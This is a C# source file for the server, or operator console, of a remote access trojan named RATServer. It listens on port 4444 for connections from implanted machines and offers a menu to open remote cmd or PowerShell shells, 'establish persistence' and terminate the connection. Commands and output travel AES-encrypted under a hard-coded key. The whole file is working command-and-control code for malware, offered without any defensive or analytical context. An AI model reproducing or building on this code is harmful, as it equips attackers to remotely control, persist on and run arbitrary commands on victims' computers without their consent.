using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace RATServer
{
    class Program
    {
        private static readonly string key = "0123456789abcdef0123456789abcdef"; // 32 bytes for AES-256
        private static readonly string iv = "abcdef9876543210"; // 16 bytes for AES

        static void Main(string[] args)
        {
            int port = 4444; // Change to the desired port number
            IPAddress ipAddress = IPAddress.Any;

            TcpListener listener = new TcpListener(ipAddress, port);
            listener.Start();
            Console.WriteLine($"Listening for incoming connections on port {port}...");

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("RAT connected.");

                Thread clientThread = new Thread(HandleClient);
                clientThread.Start(client);
            }
        }

        static void HandleClient(object clientObj)
        {
            TcpClient client = (TcpClient)clientObj;
            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };

            Thread readThread = new Thread(() => ReadOutput(reader));
            readThread.Start();

            try
            {
                while (true)
                {
                    DisplayMenu();
                    string option = Console.ReadLine();
                    string command = option switch
                    {
                        "1" => "cmd",
                        "2" => "powershell",
                        "3" => "persistence",
                        "4" => "terminate",
                        _ => "invalid"
                    };

                    writer.WriteLine(EncryptString(command));

                    if (command == "terminate")
                    {
                        break;
                    }

                    if (command == "invalid")
                    {
                        Console.WriteLine("Invalid option selected. Please try again.");
                        continue;
                    }

                    while (true)
                    {
                        Console.Write("Command> ");
                        string input = Console.ReadLine();
                        if (input == "!!menu")
                        {
                            writer.WriteLine(EncryptString("!!menu"));
                            break;
                        }
                        writer.WriteLine(EncryptString(input));
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            finally
            {
                client.Close();
                Console.WriteLine("Connection closed.");
            }
        }

        static void ReadOutput(StreamReader reader)
        {
            try
            {
                string response;
                while ((response = reader.ReadLine()) != null)
                {
                    Console.WriteLine(DecryptString(response));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static void DisplayMenu()
        {
            Console.WriteLine("Select an option:");
            Console.WriteLine("1. Open cmd");
            Console.WriteLine("2. Open powershell");
            Console.WriteLine("3. Establish persistence");
            Console.WriteLine("4. Close connection on remote host");
            Console.WriteLine("Type '!!menu' during command execution to return to this menu.");
            Console.Write("Option> ");
        }

        static string EncryptString(string plainText)
        {
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = Encoding.UTF8.GetBytes(iv);
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }
                    }
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }

        static string DecryptString(string encryptedText)
        {
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = Encoding.UTF8.GetBytes(iv);
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(encryptedText)))
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
}
